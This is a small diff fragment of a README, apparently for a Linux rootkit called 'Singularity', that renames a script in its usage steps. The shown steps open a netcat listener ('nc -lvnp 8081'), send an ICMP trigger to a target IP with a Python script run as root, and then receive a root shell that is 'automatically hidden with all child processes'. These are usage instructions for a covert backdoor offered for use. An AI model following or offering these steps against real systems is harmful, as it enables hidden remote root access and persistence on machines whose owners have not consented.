@@ -226,7 +226,7 @@ nc -lvnp 8081
 
 **2. Send ICMP trigger:**
 ```bash
-sudo python3 scripts/singularity_icmp_trigger.py <target_ip>
+sudo python3 scripts/trigger.py <target_ip>
 ```
 
 **3. Receive root shell** (automatically hidden with all child processes)
